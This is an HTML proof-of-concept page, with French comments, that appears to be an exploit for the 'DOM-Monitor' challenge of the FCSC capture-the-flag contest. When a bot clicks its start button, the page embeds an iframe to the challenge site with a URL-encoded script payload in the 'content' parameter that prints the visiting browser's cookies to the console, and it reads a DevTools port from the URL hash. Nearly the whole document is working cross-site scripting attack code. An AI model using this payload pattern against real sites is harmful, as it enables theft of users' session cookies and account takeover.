<!doctype html>
<html>
<head>
  <title>DOM-Monitor FCSC PoC</title>
  <style>
    #output {
      white-space: pre;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <button id="start">start</button>
  <div id="output"></div>

  <script>
    // Fonction pour ajouter des logs à notre page
    function log(msg, isError) {
      const output = document.getElementById('output');
      const line = document.createElement('div');
      line.textContent = msg;
      if (isError) line.style.color = 'red';
      output.appendChild(line);
      console.log(msg);
    }

    (async function() {
      // Récupérer le port depuis le hash de l'URL
      const port = location.hash.slice(1);
      log('[+] Port DevTools détecté: ' + port);
      
      // Le bot clique sur #start → notre code s'exécute
      document.getElementById('start').onclick = async function() {
        log('[+] Bouton start cliqué, lancement de l\'exploit...');

        try {
          // Approche simple - afficher le cookie en clair dans la console
          log('[+] Création d\'un iframe avec XSS vers dom-monitor.fcsc.fr...');
          
          // Contenu qui injecte un script pour afficher le cookie
          const payload = encodeURIComponent('<script>console.log("COOKIE: " + document.cookie)<\/script>');
          
          const iframe = document.createElement('iframe');
          iframe.src = 'https://dom-monitor.fcsc.fr/?content=' + payload;
          iframe.style.display = 'block';
          iframe.style.width = '100%';
          iframe.style.height = '200px';
          document.body.appendChild(iframe);
          
          log('[+] Iframe créé, le cookie devrait apparaître dans la console du bot');
        } catch (e) {
          log('[!] Erreur: ' + e.toString(), true);
        }
      };
    })();
  </script>
</body>
</html> 
